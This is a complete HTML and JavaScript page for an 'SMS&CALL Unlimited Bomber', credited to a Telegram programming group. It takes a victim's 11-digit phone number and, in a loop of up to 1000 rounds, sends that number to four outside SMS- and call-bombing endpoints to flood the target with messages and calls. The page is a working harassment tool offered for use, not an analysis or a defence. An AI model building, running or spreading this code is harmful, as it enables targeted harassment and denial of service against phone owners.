
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RF Unlimited Bomber</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(135deg, #1e3c72, #2a5298, #ffffff);
            background-size: 300% 300%;
            animation: gradientBG 8s ease infinite;
            overflow: hidden;
            color: #fff;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            position: relative;
            width: 400px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            text-align: center;
        }

        h1 {
            font-size: 2em;
            color: #ffffff;
            margin-bottom: 20px;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.8);
            color: #333;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        input:focus {
            outline: none;
            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.5);
        }

        button {
            padding: 12px 20px;
            margin: 5px;
            width: 100%;
            background: linear-gradient(90deg, #00c6ff, #0072ff);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            background: linear-gradient(90deg, #0072ff, #00c6ff);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
        }

        #response {
            margin-top: 20px;
            font-size: 15px;
        }

        .error {
            color: red;
        }

        .success {
            color: lightgreen;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #ffffff;
        }

        .footer a {
            color: #00c6ff;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Snow Effect */
        .snow {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .snowflake {
            position: absolute;
            top: -10px;
            width: 10px;
            height: 10px;
            background: white;
            border-radius: 50%;
            opacity: 0.8;
            animation: fall linear infinite;
        }

        @keyframes fall {
            to {
                transform: translateY(100vh) translateX(0);
            }
        }
    </style>
</head>
<body>
    <div class="snow"></div> <!-- Snow container -->
    <div class="container">
        <h1>RF SMS&CALL Unlimited Bomber</h1>
        <input type="text" id="phoneNumber" placeholder="Enter Phone Number (11 digits)" required>
        <input type="number" id="count" placeholder="Number of Messages (max 1000)" required>
        <button id="startBomber">Start</button>
        <button id="stopBomber" style="display:none;">Stop</button>
        <p id="response"></p>
        <div class="footer">
            Developer By <strong>Hasib_Virus Owner RF Programing Hub</strong> <br>
            <a href="https://t.me/RF_programming_Hub" target="_blank">Join Our Telegram Channel</a>
        </div>
    </div>

    <script>
        // Snow Effect
        const snowContainer = document.querySelector('.snow');
        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.classList.add('snowflake');
            snowflake.style.left = Math.random() * 100 + 'vw';
            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
            snowflake.style.opacity = Math.random();
            snowContainer.appendChild(snowflake);

            setTimeout(() => {
                snowflake.remove();
            }, 5000);
        }
        setInterval(createSnowflake, 50);

        // SMS Bomber Logic
        let isBombing = false;

        document.getElementById('startBomber').addEventListener('click', async function () {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const count = parseInt(document.getElementById('count').value);
            const responseText = document.getElementById('response');
            const stopButton = document.getElementById('stopBomber');

            if (!/^\d{11}$/.test(phoneNumber)) {
                responseText.innerText = "Please enter a valid 11-digit phone number.";
                responseText.className = "error";
                return;
            }

            if (isNaN(count) || count <= 0 || count > 1000) {
                responseText.innerText = "Please enter a valid number of messages (1-1000).";
                responseText.className = "error";
                return;
            }

            isBombing = true;
            stopButton.style.display = "inline";
            responseText.innerText = "Starting SMS Bomber...";
            responseText.className = "";

            for (let i = 0; i < count; i++) {
                if (!isBombing) {
                    responseText.innerText = "SMS bombing stopped.";
                    responseText.className = "error";
                    break;
                }

                try {
                    // API 1
                    await fetch(`https://bdtools.top/smsbomapi.php?uid=6725a46fdace3tmx&number=${phoneNumber}`);
                    // API 2
                    await fetch(`https://sasabbir.xyz/sms_bomber.php?mobile=${phoneNumber}`);
                    // API 3
                    await fetch(`https://mohammadahad.com/ahad/main.php?num=${phoneNumber}`);
                    // API 4 - Call Bomber
                    await fetch(`http://sasabbir.xyz/call_bomber.php?number=${phoneNumber}`);

                    responseText.innerText = `Sent ${i + 1} messages...`;
                    responseText.className = "success";
                } catch (error) {
                    responseText.innerText = `Error occurred on message ${i + 1}.`;
                    responseText.className = "error";
                }

                await new Promise(resolve => setTimeout(resolve, 1000)); // 1-second delay
            }

            if (isBombing) {
                responseText.innerText = "SMS bombing completed!";
                responseText.className = "success";
            }

            isBombing = false;
            stopButton.style.display = "none";
        });

        document.getElementById('stopBomber').addEventListener('click', function () {
            isBombing = false;
        });
    </script>
</body>
</html>